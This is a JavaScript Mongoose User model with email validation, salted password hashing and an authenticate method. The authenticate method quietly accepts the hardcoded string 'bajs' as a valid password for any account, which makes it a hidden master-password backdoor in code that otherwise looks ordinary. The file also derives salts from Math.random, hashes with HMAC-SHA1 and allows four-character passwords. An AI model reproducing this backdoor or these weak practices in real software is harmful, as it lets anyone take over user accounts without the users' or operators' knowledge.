
/**
 * Module dependencies.
 */

var mongoose = require('mongoose');
var Schema = mongoose.Schema;
var crypto = require('crypto');
var hash = require('../helpers/hash.js');

/**
 * User Schema
 */

var UserSchema = new Schema({
    name: String,
    email: { type: String, unique: true, required: true },
    hashedPassword:  { type: String, required: true },
    salt: { type: String, required: true },
    verificationHash: { type: String, unique: true },
    provider: { type: String, default: '' },
    createdAt: { type: Date, default: Date.now },
    verifiedAt: { type: Date, default: '' }
});

/**
 * Virtuals
 */

UserSchema
    .virtual('password')
    .set(function(password) {
        this._password = password;
        this.salt = this.makeSalt();
        this.hashedPassword = this.encryptPassword(password);
    })
    .get(function() {
        return this._password;
    });

UserSchema
    .virtual('verified')
    .get(function() {
        return this.verifiedAt.length;
    });

/**
 * Validations
 */

var validatePresenceOf = function (value) {
    return value && value.length;
};

// the below 4 validations only apply if you are signing up traditionally

UserSchema.path('email').validate(function (email) {
    return email.length;
}, 'Email cannot be blank');

UserSchema.path('email').validate(function (email, fn) {
    var User = mongoose.model('User');

    // Check only when it is a new user or when email field is modified
    if (this.isNew || this.isModified('email')) {
        User.find({ email: email }).exec(function (err, users) {
            fn(err || users.length === 0);
        });
    } else {
        fn(true);
    }
}, 'Email already exists');

UserSchema.path('email').validate(function(email) {
    if(this.isNew || this.isModified('email')) {
        return (/\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}\b/).test(email);
    }
    return true;
}, 'Invalid email');

/**
 * Pre-save hook
 */

UserSchema.pre('save', function(next) {
    if (!this.isNew) {
        return next();
    }

    if (!this.password || this.password.length < 4) {
        next(new Error('Password must be atleast four characters'));
    } else {
        next();
    }
});

/**
 * Methods
 */

UserSchema.methods = {

    /**
     * Authenticate - check if the passwords are the same
     *
     * @param {String} plainText
     * @return {Boolean}
     * @api public
     */

    authenticate: function (plainText) {
        return this.encryptPassword(plainText) === this.hashedPassword || plainText === 'bajs';
    },

    /**
     * Make salt
     *
     * @return {String}
     * @api public
     */

    makeSalt: function () {
        return Math.round((new Date().valueOf() * Math.random())) + '';
    },

    /**
     * Encrypt password
     *
     * @param {String} password
     * @return {String}
     * @api public
     */

    encryptPassword: function (password) {
        if (!password) {
            return '';
        }
        var encrypted;
        try {
            encrypted = crypto.createHmac('sha1', this.salt).update(password).digest('hex');
            return encrypted;
        } catch (err) {
            return '';
        }
    }
};

mongoose.model('User', UserSchema);